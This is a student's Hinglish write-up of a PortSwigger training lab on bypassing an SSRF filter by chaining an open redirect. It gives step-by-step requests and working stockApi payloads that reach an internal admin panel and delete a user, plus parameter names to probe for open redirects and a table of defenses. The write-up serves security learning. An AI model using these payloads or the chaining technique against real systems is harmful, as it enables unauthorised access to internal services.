// PortSwigger Labs ---> Platform
---
## Lab: 5 — SSRF with Filter Bypass via Open Redirection
## Difficulty Level : 🟡 PRACTITIONER

---

### Where I Found Vulnerability ?
- **URL:** `/product?productId=2`
- **Parameter:** `stockApi`
- **Hidden Feature:** "Next Product" button — yahan open redirect tha
- **Defense:** Server sirf same-origin (relative) URLs allow karta tha `stockApi` mein — direct internal IPs blocked the

---

### Steps ?

1. Product page pe **Check Stock** button click karo, Burp mein intercept karo
2. `stockApi` parameter dikhe ga — yahan direct `http://192.168.0.12:8080/admin` dalne se blocked hoga
3. Ab **Next Product** button ka request intercept karo
4. Notice karo us request ka format:
   ```
   GET /product/nextProduct?currentProductId=2&path=/product?productId=3
   ```
5. Yahan `path` parameter open redirect hai — yeh kisi bhi URL pe redirect kar sakta hai
6. Ab `stockApi` mein yeh open redirect use karo aur `path` ko internal admin URL pe point karo:
   ```
   stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin
   ```
7. Admin panel mil gaya ✅ — Carlos ka delete link dhundo
8. Final delete payload bhejo → Lab solved ✅

---

### Working Payloads ?

**Blocked (Direct internal IP nahi chali):**
```
stockApi=http://192.168.0.12:8080/admin     ← Direct internal IP blocked
stockApi=http://localhost/admin              ← localhost blocked
```

**Step 1 — Admin Panel Access:**
```
stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin
```

**Step 2 — Delete Carlos (Final Payload):**
```
stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

### Why it Worked ?

**Open Redirect = SSRF ka backdoor:**
- Server ne `stockApi` mein direct external/internal IPs block ki thi
- Lekin server ne apne **khud ke relative URLs** ko trust kiya — same origin toh safe hai na?
- `/product/nextProduct` ek legitimate endpoint tha — server ne ise allow kar diya
- Us endpoint ka `path` parameter **kisi bhi URL pe redirect** kar sakta tha — yahi vulnerability thi
- Server ne redirect follow kiya → internal `192.168.0.12:8080` pe pohonch gaya → SSRF success ✅

```
Normal SSRF attempt:
  stockApi=http://192.168.0.12:8080/admin  →  ❌ BLOCKED (external IP filter)

Open Redirect bypass:
  stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
                    ↓
  Server trusts relative URL ✅
                    ↓
  nextProduct redirects to → http://192.168.0.12:8080/admin
                    ↓
  Server follows redirect → Internal admin access ✅
```

---

### What I Learned ?

- **Open Redirect + SSRF = Powerful combo** — Ek vulnerability doosri ko bypass karne mein help karti hai
- Agar application ke andar koi bhi open redirect endpoint ho, woh SSRF filter bypass ke liye use ho sakta hai
- Server jo apne **khud ke endpoints pe trust karta hai**, woh open redirect ke through exploit ho sakta hai
- `path`, `url`, `redirect`, `next`, `return` — yeh parameters hamesha open redirect ke liye check karne chahiye

**Open Redirect dhundhne ke tips:**
```
/product/nextProduct?path=         ← path parameter
/login?redirect=                   ← redirect parameter
/auth?returnUrl=                   ← returnUrl parameter
/go?url=                           ← url parameter
```

--
### SSRF Defense — What Should Developers Do ?

| Defense | Effective? | Notes |
|---------|-----------|-------|
| Blacklist IPs/keywords | ❌ Weak | Easily bypassed (Lab 4) |
| Allow only relative URLs | ❌ Weak | Open redirect can chain it (Lab 5) |
| **Whitelist allowed domains** | ✅ Strong | Only specific trusted URLs allow karo |
| **Disable unnecessary redirects** | ✅ Strong | Server-side redirects follow na kare |
| **Network-level block** | ✅ Strong | Internal IPs ko firewall se block karo |
